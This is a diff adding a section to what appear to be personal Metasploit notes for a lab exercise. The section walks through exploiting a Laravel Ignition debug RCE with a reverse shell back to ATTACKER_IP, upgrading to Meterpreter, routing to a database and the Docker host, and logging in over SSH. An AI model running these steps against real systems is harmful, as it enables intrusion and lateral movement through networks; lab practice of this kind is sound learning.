@@ -81,3 +81,35 @@ search suggester
 use post/multi/recon/local_exploit_suggester
 set SESSION 1
 run
+
+
+## Hack a Web Server in a docker image, then pivot to the DB and host
+
+```
+
+use multi/php/ignition_laravel_debug_rce
+check rhost=10.10.234.246 HttpClientTimeout=20
+run rhost=10.10.234.246 lhost=ATTACKER_IP HttpClientTimeout=20
+## At this point you will a basic shell
+background
+sessions
+sessions -u -1
+sessions
+sessions -i -1
+# At this point you will be loggecd into a Meterpreter session
+resolve webservice_database
+background
+# Database IP
+route add 172.28.101.51/32 -1
+# Host IP
+route add 172.17.0.1/32 -1
+route print
+# SSH inot host
+use auxiliary/scanner/ssh/ssh_login
+run ssh://USER:PASSWORD@172.17.0.1
+sessions
+# You should now see your ssh session
+# Login to ssh session
+sessions -i -1
+
+```
